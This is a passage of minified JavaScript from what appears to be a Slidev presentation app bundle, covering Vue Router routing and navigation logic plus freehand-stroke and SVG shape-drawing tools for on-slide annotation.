s===2&&t(`Unfinished custom RegExp for param "${u}"`),p(),i(),r}function fg(e,t,s){const o=ig(pg(e.path),s),r=$e(o,{record:e,parent:t,children:[],alias:[]});return t&&!r.record.aliasOf==!t.record.aliasOf&&t.children.push(r),r}function mg(e,t){const s=[],o=new Map;t=Oa({strict:!1,end:!0,sensitive:!1},t);function r(d){return o.get(d)}function l(d,p,f){const m=!f,h=hg(d);h.aliasOf=f&&f.record;const x=Oa(t,d),b=[h];if("alias"in d){const E=typeof d.alias=="string"?[d.alias]:d.alias;for(const B of E)b.push($e({},h,{components:f?f.record.components:h.components,path:B,aliasOf:f?f.record:h}))}let k,S;for(const E of b){const{path:B}=E;if(p&&B[0]!=="/"){const L=p.record.path,P=L[L.length-1]==="/"?"":"/";E.path=p.record.path+(B&&P+B)}if(k=fg(E,p,x),f?f.alias.push(k):(S=S||k,S!==k&&S.alias.push(k),m&&d.name&&!Fa(k)&&i(d.name)),h.children){const L=h.children;for(let P=0;P<L.length;P++)l(L[P],k,f&&f.children[P])}f=f||k,c(k)}return S?()=>{i(S)}:Is}function i(d){if(Vu(d)){const p=o.get(d);p&&(o.delete(d),s.splice(s.indexOf(p),1),p.children.forEach(i),p.alias.forEach(i))}else{const p=s.indexOf(d);p>-1&&(s.splice(p,1),d.record.name&&o.delete(d.record.name),d.children.forEach(i),d.alias.forEach(i))}}function a(){return s}function c(d){let p=0;for(;p<s.length&&cg(d,s[p])>=0&&(d.record.path!==s[p].record.path||!Wu(d,s[p]));)p++;s.splice(p,0,d),d.record.name&&!Fa(d)&&o.set(d.record.name,d)}function u(d,p){let f,m={},h,x;if("name"in d&&d.name){if(f=o.get(d.name),!f)throw as(1,{location:d});x=f.record.name,m=$e(Ba(p.params,f.keys.filter(S=>!S.optional).map(S=>S.name)),d.params&&Ba(d.params,f.keys.map(S=>S.name))),h=f.stringify(m)}else if("path"in d)h=d.path,f=s.find(S=>S.re.test(h)),f&&(m=f.parse(h),x=f.record.name);else{if(f=p.name?o.get(p.name):s.find(S=>S.re.test(p.path)),!f)throw as(1,{location:d,currentLocation:p});x=f.record.name,m=$e({},p.params,d.params),h=f.stringify(m)}const b=[];let k=f;for(;k;)b.unshift(k.record),k=k.parent;return{name:x,path:h,params:m,matched:b,meta:yg(b)}}return e.forEach(d=>l(d)),{addRoute:l,resolve:u,removeRoute:i,getRoutes:a,getRecordMatcher:r}}function Ba(e,t){const s={};for(const o of t)o in e&&(s[o]=e[o]);return s}function hg(e){return{path:e.path,redirect:e.redirect,name:e.name,meta:e.meta||{},aliasOf:void 0,beforeEnter:e.beforeEnter,props:gg(e),children:e.children||[],instances:{},leaveGuards:new Set,updateGuards:new Set,enterCallbacks:{},components:"components"in e?e.components||null:e.component&&{default:e.component}}}function gg(e){const t={},s=e.props||!1;if("component"in e)t.default=s;else for(const o in e.components)t[o]=typeof s=="boolean"?s:s[o];return t}function Fa(e){for(;e;){if(e.record.aliasOf)return!0;e=e.parent}return!1}function yg(e){return e.reduce((t,s)=>$e(t,s.meta),{})}function Oa(e,t){const s={};for(const o in e)s[o]=o in t?t[o]:e[o];return s}function Wu(e,t){return t.children.some(s=>s===e||Wu(e,s))}const Yu=/#/g,vg=/&/g,_g=/\//g,bg=/=/g,xg=/\?/g,Ku=/\+/g,wg=/%5B/g,Eg=/%5D/g,Xu=/%5E/g,Ag=/%60/g,Qu=/%7B/g,Sg=/%7C/g,Zu=/%7D/g,kg=/%20/g;function Wl(e){return encodeURI(""+e).replace(Sg,"|").replace(wg,"[").replace(Eg,"]")}function Cg(e){return Wl(e).replace(Qu,"{").replace(Zu,"}").replace(Xu,"^")}function nl(e){return Wl(e).replace(Ku,"%2B").replace(kg,"+").replace(Yu,"%23").replace(vg,"%26").replace(Ag,"`").replace(Qu,"{").replace(Zu,"}").replace(Xu,"^")}function $g(e){return nl(e).replace(bg,"%3D")}function Dg(e){return Wl(e).replace(Yu,"%23").replace(xg,"%3F")}function Bg(e){return e==null?"":Dg(e).replace(_g,"%2F")}function Mo(e){try{return decodeURIComponent(""+e)}catch{}return""+e}function Fg(e){const t={};if(e===""||e==="?")return t;const o=(e[0]==="?"?e.slice(1):e).split("&");for(let r=0;r<o.length;++r){const l=o[r].replace(Ku," "),i=l.indexOf("="),a=Mo(i<0?l:l.slice(0,i)),c=i<0?null:Mo(l.slice(i+1));if(a in t){let u=t[a];Mt(u)||(u=t[a]=[u]),u.push(c)}else t[a]=c}return t}function Ia(e){let t="";for(let s in e){const o=e[s];if(s=$g(s),o==null){o!==void 0&&(t+=(t.length?"&":"")+s);continue}(Mt(o)?o.map(l=>l&&nl(l)):[o&&nl(o)]).forEach(l=>{l!==void 0&&(t+=(t.length?"&":"")+s,l!=null&&(t+="="+l))})}return t}function Og(e){const t={};for(const s in e){const o=e[s];o!==void 0&&(t[s]=Mt(o)?o.map(r=>r==null?null:""+r):o==null?o:""+o)}return t}const Ig=Symbol(""),Ta=Symbol(""),Yl=Symbol(""),Gu=Symbol(""),sl=Symbol("");function ws(){let e=[];function t(o){return e.push(o),()=>{const r=e.indexOf(o);r>-1&&e.splice(r,1)}}function s(){e=[]}return{add:t,list:()=>e,reset:s}}function on(e,t,s,o,r){const l=o&&(o.enterCallbacks[r]=o.enterCallbacks[r]||[]);return()=>new Promise((i,a)=>{const c=p=>{p===!1?a(as(4,{from:s,to:t})):p instanceof Error?a(p):og(p)?a(as(2,{from:t,to:p})):(l&&o.enterCallbacks[r]===l&&typeof p=="function"&&l.push(p),i())},u=e.call(o&&o.instances[r],t,s,c);let d=Promise.resolve(u);e.length<3&&(d=d.then(c)),d.catch(p=>a(p))})}function _r(e,t,s,o){const r=[];for(const l of e)for(const i in l.components){let a=l.components[i];if(!(t!=="beforeRouteEnter"&&!l.instances[i]))if(Tg(a)){const u=(a.__vccOpts||a)[t];u&&r.push(on(u,s,o,l,i))}else{let c=a();r.push(()=>c.then(u=>{if(!u)return Promise.reject(new Error(`Couldn't resolve component "${i}" at "${l.path}"`));const d=q0(u)?u.default:u;l.components[i]=d;const f=(d.__vccOpts||d)[t];return f&&on(f,s,o,l,i)()}))}}return r}function Tg(e){return typeof e=="object"||"displayName"in e||"props"in e||"__vccOpts"in e}function Pa(e){const t=N(Yl),s=N(Gu),o=D(()=>t.resolve(w(e.to))),r=D(()=>{const{matched:c}=o.value,{length:u}=c,d=c[u-1],p=s.matched;if(!d||!p.length)return-1;const f=p.findIndex(is.bind(null,d));if(f>-1)return f;const m=Ma(c[u-2]);return u>1&&Ma(d)===m&&p[p.length-1].path!==m?p.findIndex(is.bind(null,c[u-2])):f}),l=D(()=>r.value>-1&&Rg(s.params,o.value.params)),i=D(()=>r.value>-1&&r.value===s.matched.length-1&&Hu(s.params,o.value.params));function a(c={}){return Lg(c)?t[w(e.replace)?"replace":"push"](w(e.to)).catch(Is):Promise.resolve()}return{route:o,href:D(()=>o.value.href),isActive:l,isExactActive:i,navigate:a}}const Pg=Ae({name:"RouterLink",compatConfig:{MODE:3},props:{to:{type:[String,Object],required:!0},replace:Boolean,activeClass:String,exactActiveClass:String,custom:Boolean,ariaCurrentValue:{type:String,default:"page"}},useLink:Pa,setup(e,{slots:t}){const s=Me(Pa(e)),{options:o}=N(Yl),r=D(()=>({[La(e.activeClass,o.linkActiveClass,"router-link-active")]:s.isActive,[La(e.exactActiveClass,o.linkExactActiveClass,"router-link-exact-active")]:s.isExactActive}));return()=>{const l=t.default&&t.default(s);return e.custom?l:vt("a",{"aria-current":s.isExactActive?e.ariaCurrentValue:null,href:s.href,onClick:s.navigate,class:r.value},l)}}}),Mg=Pg;function Lg(e){if(!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)&&!e.defaultPrevented&&!(e.button!==void 0&&e.button!==0)){if(e.currentTarget&&e.currentTarget.getAttribute){const t=e.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(t))return}return e.preventDefault&&e.preventDefault(),!0}}function Rg(e,t){for(const s in t){const o=t[s],r=e[s];if(typeof o=="string"){if(o!==r)return!1}else if(!Mt(r)||r.length!==o.length||o.some((l,i)=>l!==r[i]))return!1}return!0}function Ma(e){return e?e.aliasOf?e.aliasOf.path:e.path:""}const La=(e,t,s)=>e!=null?e:t!=null?t:s,Ng=Ae({name:"RouterView",inheritAttrs:!1,props:{name:{type:String,default:"default"},route:Object},compatConfig:{MODE:3},setup(e,{attrs:t,slots:s}){const o=N(sl),r=D(()=>e.route||o.value),l=N(Ta,0),i=D(()=>{let u=w(l);const{matched:d}=r.value;let p;for(;(p=d[u])&&!p.components;)u++;return u}),a=D(()=>r.value.matched[i.value]);yt(Ta,D(()=>i.value+1)),yt(Ig,a),yt(sl,r);const c=z();return me(()=>[c.value,a.value,e.name],([u,d,p],[f,m,h])=>{d&&(d.instances[p]=u,m&&m!==d&&u&&u===f&&(d.leaveGuards.size||(d.leaveGuards=m.leaveGuards),d.updateGuards.size||(d.updateGuards=m.updateGuards))),u&&d&&(!m||!is(d,m)||!f)&&(d.enterCallbacks[p]||[]).forEach(x=>x(u))},{flush:"post"}),()=>{const u=r.value,d=e.name,p=a.value,f=p&&p.components[d];if(!f)return Ra(s.default,{Component:f,route:u});const m=p.props[d],h=m?m===!0?u.params:typeof m=="function"?m(u):m:null,b=vt(f,$e({},h,t,{onVnodeUnmounted:k=>{k.component.isUnmounted&&(p.instances[d]=null)},ref:c}));return Ra(s.default,{Component:b,route:u})||b}}});function Ra(e,t){if(!e)return null;const s=e(t);return s.length===1?s[0]:s}const qg=Ng;function jg(e){const t=mg(e.routes,e),s=e.parseQuery||Fg,o=e.stringifyQuery||Ia,r=e.history,l=ws(),i=ws(),a=ws(),c=Tt(nn);let u=nn;Yn&&e.scrollBehavior&&"scrollRestoration"in history&&(history.scrollRestoration="manual");const d=yr.bind(null,F=>""+F),p=yr.bind(null,Bg),f=yr.bind(null,Mo);function m(F,K){let q,G;return Vu(F)?(q=t.getRecordMatcher(F),G=K):G=F,t.addRoute(G,q)}function h(F){const K=t.getRecordMatcher(F);K&&t.removeRoute(K)}function x(){return t.getRoutes().map(F=>F.record)}function b(F){return!!t.getRecordMatcher(F)}function k(F,K){if(K=$e({},K||c.value),typeof F=="string"){const ne=vr(s,F,K.path),g=t.resolve({path:ne.path},K),v=r.createHref(ne.fullPath);return $e(ne,g,{params:f(g.params),hash:Mo(ne.hash),redirectedFrom:void 0,href:v})}let q;if("path"in F)q=$e({},F,{path:vr(s,F.path,K.path).path});else{const ne=$e({},F.params);for(const g in ne)ne[g]==null&&delete ne[g];q=$e({},F,{params:p(F.params)}),K.params=p(K.params)}const G=t.resolve(q,K),xe=F.hash||"";G.params=d(f(G.params));const ge=z0(o,$e({},F,{hash:Cg(xe),path:G.path})),ie=r.createHref(ge);return $e({fullPath:ge,hash:xe,query:o===Ia?Og(F.query):F.query||{}},G,{redirectedFrom:void 0,href:ie})}function S(F){return typeof F=="string"?vr(s,F,c.value.path):$e({},F)}function E(F,K){if(u!==F)return as(8,{from:K,to:F})}function B(F){return H(F)}function L(F){return B($e(S(F),{replace:!0}))}function P(F){const K=F.matched[F.matched.length-1];if(K&&K.redirect){const{redirect:q}=K;let G=typeof q=="function"?q(F):q;return typeof G=="string"&&(G=G.includes("?")||G.includes("#")?G=S(G):{path:G},G.params={}),$e({query:F.query,hash:F.hash,params:"path"in G?{}:F.params},G)}}function H(F,K){const q=u=k(F),G=c.value,xe=F.state,ge=F.force,ie=F.replace===!0,ne=P(q);if(ne)return H($e(S(ne),{state:typeof ne=="object"?$e({},xe,ne.state):xe,force:ge,replace:ie}),K||q);const g=q;g.redirectedFrom=K;let v;return!ge&&V0(o,G,q)&&(v=as(16,{to:g,from:G}),De(G,G,!0,!1)),(v?Promise.resolve(v):le(g,G)).catch(A=>Wt(A)?Wt(A,2)?A:fe(A):Q(A,g,G)).then(A=>{if(A){if(Wt(A,2))return H($e({replace:ie},S(A.to),{state:typeof A.to=="object"?$e({},xe,A.to.state):xe,force:ge}),K||g)}else A=_e(g,G,!0,ie,xe);return ye(g,G,A),A})}function te(F,K){const q=E(F,K);return q?Promise.reject(q):Promise.resolve()}function le(F,K){let q;const[G,xe,ge]=Hg(F,K);q=_r(G.reverse(),"beforeRouteLeave",F,K);for(const ne of G)ne.leaveGuards.forEach(g=>{q.push(on(g,F,K))});const ie=te.bind(null,F,K);return q.push(ie),Hn(q).then(()=>{q=[];for(const ne of l.list())q.push(on(ne,F,K));return q.push(ie),Hn(q)}).then(()=>{q=_r(xe,"beforeRouteUpdate",F,K);for(const ne of xe)ne.updateGuards.forEach(g=>{q.push(on(g,F,K))});return q.push(ie),Hn(q)}).then(()=>{q=[];for(const ne of F.matched)if(ne.beforeEnter&&!K.matched.includes(ne))if(Mt(ne.beforeEnter))for(const g of ne.beforeEnter)q.push(on(g,F,K));else q.push(on(ne.beforeEnter,F,K));return q.push(ie),Hn(q)}).then(()=>(F.matched.forEach(ne=>ne.enterCallbacks={}),q=_r(ge,"beforeRouteEnter",F,K),q.push(ie),Hn(q))).then(()=>{q=[];for(const ne of i.list())q.push(on(ne,F,K));return q.push(ie),Hn(q)}).catch(ne=>Wt(ne,8)?ne:Promise.reject(ne))}function ye(F,K,q){for(const G of a.list())G(F,K,q)}function _e(F,K,q,G,xe){const ge=E(F,K);if(ge)return ge;const ie=K===nn,ne=Yn?history.state:{};q&&(G||ie?r.replace(F.fullPath,$e({scroll:ie&&ne&&ne.scroll},xe)):r.push(F.fullPath,xe)),c.value=F,De(F,K,q,ie),fe()}let ze;function Ve(){ze||(ze=r.listen((F,K,q)=>{if(!yn.listening)return;const G=k(F),xe=P(G);if(xe){H($e(xe,{replace:!0}),G).catch(Is);return}u=G;const ge=c.value;Yn&&G0(Sa(ge.fullPath,q.delta),or()),le(G,ge).catch(ie=>Wt(ie,12)?ie:Wt(ie,2)?(H(ie.to,G).then(ne=>{Wt(ne,20)&&!q.delta&&q.type===Ys.pop&&r.go(-1,!1)}).catch(Is),Promise.reject()):(q.delta&&r.go(-q.delta,!1),Q(ie,G,ge))).then(ie=>{ie=ie||_e(G,ge,!1),ie&&(q.delta&&!Wt(ie,8)?r.go(-q.delta,!1):q.type===Ys.pop&&Wt(ie,20)&&r.go(-1,!1)),ye(G,ge,ie)}).catch(Is)}))}let qe=ws(),Ie=ws(),Le;function Q(F,K,q){fe(F);const G=Ie.list();return G.length?G.forEach(xe=>xe(F,K,q)):console.error(F),Promise.reject(F)}function se(){return Le&&c.value!==nn?Promise.resolve():new Promise((F,K)=>{qe.add([F,K])})}function fe(F){return Le||(Le=!F,Ve(),qe.list().forEach(([K,q])=>F?q(F):K()),qe.reset()),F}function De(F,K,q,G){const{scrollBehavior:xe}=e;if(!Yn||!xe)return Promise.resolve();const ge=!q&&J0(Sa(F.fullPath,0))||(G||!q)&&history.state&&history.state.scroll||null;return et().then(()=>xe(F,K,ge)).then(ie=>ie&&Z0(ie)).catch(ie=>Q(ie,F,K))}const dt=F=>r.go(F);let Ge;const ct=new Set,yn={currentRoute:c,listening:!0,addRoute:m,removeRoute:h,hasRoute:b,getRoutes:x,resolve:k,options:e,push:B,replace:L,go:dt,back:()=>dt(-1),forward:()=>dt(1),beforeEach:l.add,beforeResolve:i.add,afterEach:a.add,onError:Ie.add,isReady:se,install(F){const K=this;F.component("RouterLink",Mg),F.component("RouterView",qg),F.config.globalProperties.$router=K,Object.defineProperty(F.config.globalProperties,"$route",{enumerable:!0,get:()=>w(c)}),Yn&&!Ge&&c.value===nn&&(Ge=!0,B(r.location).catch(xe=>{}));const q={};for(const xe in nn)q[xe]=D(()=>c.value[xe]);F.provide(Yl,K),F.provide(Gu,Me(q)),F.provide(sl,c);const G=F.unmount;ct.add(F),F.unmount=function(){ct.delete(F),ct.size<1&&(u=nn,ze&&ze(),ze=null,c.value=nn,Ge=!1,Le=!1),G()}}};return yn}function Hn(e){return e.reduce((t,s)=>t.then(()=>s()),Promise.resolve())}function Hg(e,t){const s=[],o=[],r=[],l=Math.max(t.matched.length,e.matched.length);for(let i=0;i<l;i++){const a=t.matched[i];a&&(e.matched.find(u=>is(u,a))?o.push(a):s.push(a));const c=e.matched[i];c&&(t.matched.find(u=>is(u,c))||r.push(c))}return[s,o,r]}const br=z(!1),Ps=z(!1),Xn=z(!1),zg=z(!0),ol=t0({xs:460,...Qh}),Mn=N0(),Ju=$0(),Vg=D(()=>Mn.height.value-Mn.width.value/cn>180),ed=S0(Pt?document.body:null),ns=Xh(),Ug=D(()=>{var e,t;return["INPUT","TEXTAREA"].includes(((e=ns.value)==null?void 0:e.tagName)||"")||((t=ns.value)==null?void 0:t.classList.contains("CodeMirror-code"))}),Wg=D(()=>{var e;return["BUTTON","A"].includes(((e=ns.value)==null?void 0:e.tagName)||"")});Lt("slidev-camera","default");Lt("slidev-mic","default");const wo=Lt("slidev-scale",0),rt=Lt("slidev-show-overview",!1),xr=Lt("slidev-presenter-cursor",!0),Na=Lt("slidev-show-editor",!1);Lt("slidev-editor-width",Pt?window.innerWidth*.4:100);const td=Nu(rt);function qa(e,t,s,o=r=>r){return e*o(.5-t*(.5-s))}function Yg(e){return[-e[0],-e[1]]}function Ct(e,t){return[e[0]+t[0],e[1]+t[1]]}function Et(e,t){return[e[0]-t[0],e[1]-t[1]]}function kt(e,t){return[e[0]*t,e[1]*t]}function Kg(e,t){return[e[0]/t,e[1]/t]}function Es(e){return[e[1],-e[0]]}function ja(e,t){return e[0]*t[0]+e[1]*t[1]}function Xg(e,t){return e[0]===t[0]&&e[1]===t[1]}function Qg(e){return Math.hypot(e[0],e[1])}function Zg(e){return e[0]*e[0]+e[1]*e[1]}function Ha(e,t){return Zg(Et(e,t))}function nd(e){return Kg(e,Qg(e))}function Gg(e,t){return Math.hypot(e[1]-t[1],e[0]-t[0])}function As(e,t,s){let o=Math.sin(s),r=Math.cos(s),l=e[0]-t[0],i=e[1]-t[1],a=l*r-i*o,c=l*o+i*r;return[a+t[0],c+t[1]]}function rl(e,t,s){return Ct(e,kt(Et(t,e),s))}function za(e,t,s){return Ct(e,kt(t,s))}var{min:zn,PI:Jg}=Math,Va=.275,Ss=Jg+1e-4;function ey(e,t={}){let{size:s=16,smoothing:o=.5,thinning:r=.5,simulatePressure:l=!0,easing:i=Q=>Q,start:a={},end:c={},last:u=!1}=t,{cap:d=!0,easing:p=Q=>Q*(2-Q)}=a,{cap:f=!0,easing:m=Q=>--Q*Q*Q+1}=c;if(e.length===0||s<=0)return[];let h=e[e.length-1].runningLength,x=a.taper===!1?0:a.taper===!0?Math.max(s,h):a.taper,b=c.taper===!1?0:c.taper===!0?Math.max(s,h):c.taper,k=Math.pow(s*o,2),S=[],E=[],B=e.slice(0,10).reduce((Q,se)=>{let fe=se.pressure;if(l){let De=zn(1,se.distance/s),dt=zn(1,1-De);fe=zn(1,Q+(dt-Q)*(De*Va))}return(Q+fe)/2},e[0].pressure),L=qa(s,r,e[e.length-1].pressure,i),P,H=e[0].vector,te=e[0].point,le=te,ye=te,_e=le,ze=!1;for(let Q=0;Q<e.length;Q++){let{pressure:se}=e[Q],{point:fe,vector:De,distance:dt,runningLength:Ge}=e[Q];if(Q<e.length-1&&h-Ge<3)continue;if(r){if(l){let ge=zn(1,dt/s),ie=zn(1,1-ge);se=zn(1,B+(ie-B)*(ge*Va))}L=qa(s,r,se,i)}else L=s/2;P===void 0&&(P=L);let ct=Ge<x?p(Ge/x):1,yn=h-Ge<b?m((h-Ge)/b):1;L=Math.max(.01,L*Math.min(ct,yn));let F=(Q<e.length-1?e[Q+1]:e[Q]).vector,K=Q<e.length-1?ja(De,F):1,q=ja(De,H)<0&&!ze,G=K!==null&&K<0;if(q||G){let ge=kt(Es(H),L);for(let ie=1/13,ne=0;ne<=1;ne+=ie)ye=As(Et(fe,ge),fe,Ss*ne),S.push(ye),_e=As(Ct(fe,ge),fe,Ss*-ne),E.push(_e);te=ye,le=_e,G&&(ze=!0);continue}if(ze=!1,Q===e.length-1){let ge=kt(Es(De),L);S.push(Et(fe,ge)),E.push(Ct(fe,ge));continue}let xe=kt(Es(rl(F,De,K)),L);ye=Et(fe,xe),(Q<=1||Ha(te,ye)>k)&&(S.push(ye),te=ye),_e=Ct(fe,xe),(Q<=1||Ha(le,_e)>k)&&(E.push(_e),le=_e),B=se,H=De}let Ve=e[0].point.slice(0,2),qe=e.length>1?e[e.length-1].point.slice(0,2):Ct(e[0].point,[1,1]),Ie=[],Le=[];if(e.length===1){if(!(x||b)||u){let Q=za(Ve,nd(Es(Et(Ve,qe))),-(P||L)),se=[];for(let fe=1/13,De=fe;De<=1;De+=fe)se.push(As(Q,Ve,Ss*2*De));return se}}else{if(!(x||b&&e.length===1))if(d)for(let se=1/13,fe=se;fe<=1;fe+=se){let De=As(E[0],Ve,Ss*fe);Ie.push(De)}else{let se=Et(S[0],E[0]),fe=kt(se,.5),De=kt(se,.51);Ie.push(Et(Ve,fe),Et(Ve,De),Ct(Ve,De),Ct(Ve,fe))}let Q=Es(Yg(e[e.length-1].vector));if(b||x&&e.length===1)Le.push(qe);else if(f){let se=za(qe,Q,L);for(let fe=1/29,De=fe;De<1;De+=fe)Le.push(As(se,qe,Ss*3*De))}else Le.push(Ct(qe,kt(Q,L)),Ct(qe,kt(Q,L*.99)),Et(qe,kt(Q,L*.99)),Et(qe,kt(Q,L)))}return S.concat(Le,E.reverse(),Ie)}function ty(e,t={}){var s;let{streamline:o=.5,size:r=16,last:l=!1}=t;if(e.length===0)return[];let i=.15+(1-o)*.85,a=Array.isArray(e[0])?e:e.map(({x:m,y:h,pressure:x=.5})=>[m,h,x]);if(a.length===2){let m=a[1];a=a.slice(0,-1);for(let h=1;h<5;h++)a.push(rl(a[0],m,h/4))}a.length===1&&(a=[...a,[...Ct(a[0],[1,1]),...a[0].slice(2)]]);let c=[{point:[a[0][0],a[0][1]],pressure:a[0][2]>=0?a[0][2]:.25,vector:[1,1],distance:0,runningLength:0}],u=!1,d=0,p=c[0],f=a.length-1;for(let m=1;m<a.length;m++){let h=l&&m===f?a[m].slice(0,2):rl(p.point,a[m],i);if(Xg(p.point,h))continue;let x=Gg(h,p.point);if(d+=x,m<f&&!u){if(d<r)continue;u=!0}p={point:h,pressure:a[m][2]>=0?a[m][2]:.5,vector:nd(Et(p.point,h)),distance:x,runningLength:d},c.push(p)}return c[0].vector=((s=c[1])==null?void 0:s.vector)||[0,0],c}function ny(e,t={}){return ey(ty(e,t),t)}var sy=()=>({events:{},emit(e,...t){let s=this.events[e]||[];for(let o=0,r=s.length;o<r;o++)s[o](...t)},on(e,t){var s;return(s=this.events[e])!=null&&s.push(t)||(this.events[e]=[t]),()=>{var o;this.events[e]=(o=this.events[e])==null?void 0:o.filter(r=>t!==r)}}});function Lo(e,t){return e-t}function oy(e){return e<0?-1:1}function Ro(e){return[Math.abs(e),oy(e)]}function sd(){const e=()=>((1+Math.random())*65536|0).toString(16).substring(1);return`${e()+e()}-${e()}-${e()}-${e()}-${e()}${e()}${e()}`}var ry=2,Xt=ry,ms=class{constructor(e){this.drauu=e,this.event=void 0,this.point=void 0,this.start=void 0,this.el=null}onSelected(e){}onUnselected(){}onStart(e){}onMove(e){return!1}onEnd(e){}get brush(){return this.drauu.brush}get shiftPressed(){return this.drauu.shiftPressed}get altPressed(){return this.drauu.altPressed}get svgElement(){return this.drauu.el}getMousePosition(e){var r;var t;const s=this.drauu.el,o=(r=this.drauu.options.coordinateScale)!=null?r:1;if(this.drauu.options.coordinateTransform===!1){const l=this.drauu.el.getBoundingClientRect();return{x:(e.pageX-l.left)*o,y:(e.pageY-l.top)*o,pressure:e.pressure}}else{const l=this.drauu.svgPoint;l.x=e.clientX,l.y=e.clientY;const i=l.matrixTransform((t=s.getScreenCTM())==null?void 0:t.inverse());return{x:i.x*o,y:i.y*o,pressure:e.pressure}}}createElement(e,t){var r;const s=document.createElementNS("http://www.w3.org/2000/svg",e),o=t?{...this.brush,...t}:this.brush;return s.setAttribute("fill",(r=o.fill)!=null?r:"transparent"),s.setAttribute("stroke",o.color),s.setAttribute("stroke-width",o.size.toString()),s.setAttribute("stroke-linecap","round"),o.dasharray&&s.setAttribute("stroke-dasharray",o.dasharray),s}attr(e,t){this.el.setAttribute(e,typeof t=="string"?t:t.toFixed(Xt))}_setEvent(e){this.event=e,this.point=this.getMousePosition(e)}_eventDown(e){return this._setEvent(e),this.start=this.point,this.onStart(this.point)}_eventMove(e){return this._setEvent(e),this.onMove(this.point)}_eventUp(e){return this._setEvent(e),this.onEnd(this.point)}},ly=class extends ms{constructor(){super(...arguments),this.points=[]}onStart(e){return this.el=document.createElementNS("http://www.w3.org/2000/svg","path"),this.points=[e],this.attr("fill",this.brush.color),this.attr("d",this.getSvgData(this.points)),this.el}onMove(e){return this.el||this.onStart(e),this.points[this.points.length-1]!==e&&this.points.push(e),this.attr("d",this.getSvgData(this.points)),!0}onEnd(){const e=this.el;return this.el=null,!!e}getSvgData(e){const t=ny(e,{size:this.brush.size*2,thinning:.9,simulatePressure:!1,start:{taper:5},end:{taper:5},...this.brush.stylusOptions});if(!t.length)return"";const s=t.reduce((o,[r,l],i,a)=>{const[c,u]=a[(i+1)%a.length];return o.push(r,l,(r+c)/2,(l+u)/2),o},["M",...t[0],"Q"]);return s.push("Z"),s.map(o=>typeof o=="number"?o.toFixed(2):o).join(" ")}},iy=class extends ms{onStart(e){return this.el=this.createElement("ellipse"),this.attr("cx",e.x),this.attr("cy",e.y),this.el}onMove(e){if(!this.el||!this.start)return!1;let[t,s]=Ro(e.x-this.start.x),[o,r]=Ro(e.y-this.start.y);if(this.shiftPressed){const l=Math.min(t,o);t=l,o=l}if(this.altPressed)this.attr("cx",this.start.x),this.attr("cy",this.start.y),this.attr("rx",t),this.attr("ry",o);else{const[l,i]=[this.start.x,this.start.x+t*s].sort(Lo),[a,c]=[this.start.y,this.start.y+o*r].sort(Lo);this.attr("cx",(l+i)/2),this.attr("cy",(a+c)/2),this.attr("rx",(i-l)/2),this.attr("ry",(c-a)/2)}return!0}onEnd(){const e=this.el;return this.el=null,!(!e||!e.getTotalLength())}};function od(e,t){const s=document.createElementNS("http://www.w3.org/2000/svg","defs"),o=document.createElementNS("http://www.w3.org/2000/svg","marker"),r=document.createElementNS("http://www.w3.org/2000/svg","path");return r.setAttribute("fill",t),o.setAttribute("id",e),o.setAttribute("viewBox","0 -5 10 10"),o.setAttribute("refX","5"),o.setAttribute("refY","0"),o.setAttribute("markerWidth","4"),o.setAttribute("markerHeight","4"),o.setAttribute("orient","auto"),r.setAttribute("d","M0,-5L10,0L0,5"),o.appendChild(r),s.appendChild(o),s}var ay=class extends ms{onStart(e){if(this.el=this.createElement("line",{fill:"transparent"}),this.attr("x1",e.x),this.attr("y1",e.y),this.attr("x2",e.x),this.attr("y2",e.y),this.brush.arrowEnd){const t=sd(),s=document.createElementNS("http://www.w3.org/2000/svg","g");return s.append(od(t,this.brush.color)),s.append(this.el),this.attr("marker-end",`url(#${t})`),s}return this.el}onMove(e){if(!this.el)return!1;let{x:t,y:s}=e;if(this.shiftPressed){const o=e.x-this.start.x,r=e.y-this.start.y;if(r!==0){let l=o/r;l=Math.round(l),Math.abs(l)<=1?(t=this.start.x+r*l,s=this.start.y+r):(t=this.start.x+o,s=this.start.y)}}return this.altPressed?(this.attr("x1",this.start.x*2-t),this.attr("y1",this.start.y*2-s),this.attr("x2",t),this.attr("y2",s)):(this.attr("x1",this.start.x),this.attr("y1",this.start.y),this.attr("x2",t),this.attr("y2",s)),!0}onEnd(){const e=this.el;return this.el=null,!(!e||e.getTotalLength()<5)}},cy=class extends ms{onStart(e){return this.el=this.createElement("rect"),this.brush.cornerRadius&&(this.attr("rx",this.brush.cornerRadius),this.attr("ry",this.brush.cornerRadius)),this.attr("x",e.x),this.attr("y",e.y),this.el}onMove(e){if(!this.el||!this.start)return!1;let[t,s]=Ro(e.x-this.start.x),[o,r]=Ro(e.y-this.start.y);if(this.shiftPressed){const l=Math.min(t,o);t=l,o=l}if(this.altPressed)this.attr("x",this.start.x-t),this.attr("y",this.start.y-o),this.attr("width",t*2),this.attr("height",o*2);else{const[l,i]=[this.start.x,this.start.x+t*s].sort(Lo),[a,c]=[this.start.y,this.start.y+o*r].sort(Lo);this.attr("x",l),this.attr("y",a),this.attr("width",i-l),this.attr("height",c-a)}return!0}onEnd(){const e=this.el;return this.el=null,!(!e||!e.getTotalLength())}};function uy(e,t){const s=e.x-t.x,o=e.y-t.y;return s*s+o*o}function dy(e,t,s){let o=t.x,r=t.y,l=s.x-o,i=s.y-r;if(l!==0||i!==0){const a=((e.x-o)*l+(e.y-r)*i)/(l*l+i*i);a>1?(o=s.x,r=s.y):a>0&&(o+=l*a,r+=i*a)}return l=e.x-o,i=e.y-r,l*l+i*i}function py(e,t){let s=e[0];const o=[s];let r;for(let l=1,i=e.length;l<i;l++)r=e[l],uy(r,s)>t&&(o.push(r),s=r);return s!==r&&r&&o.push(r),o}function ll(e,t,s,o,r){let l=o,i=0;for(let a=t+1;a<s;a++){const c=dy(e[a],e[t],e[s]);c>l&&(i=a,l=c)}l>o&&(i-t>1&&ll(e,t,i,o,r),r.push(e[i]),s-i>1&&ll(e,i,s,o,r))}function fy(e,t){const s=e.length-1,o=[e[0]];return ll(e,0,s,t,o),o.push(e[s]),o}function Ua(e,t,s=!1){if(e.length<=2)return e;const o=t!==void 0?t*t:1;return e=s?e:py(e,o),e=fy(e,o),e}var my=class extends ms{constructor(){super(...arguments),this.points=[],this.count=0}onStart(e){if(this.el=this.createElement("path",{fill:"transparent"}),this.points=[e],this.brush.arrowEnd){this.arrowId=sd();const t=od(this.arrowId,this.brush.color);this.el.appendChild(t)}return this.el}onMove(e){return 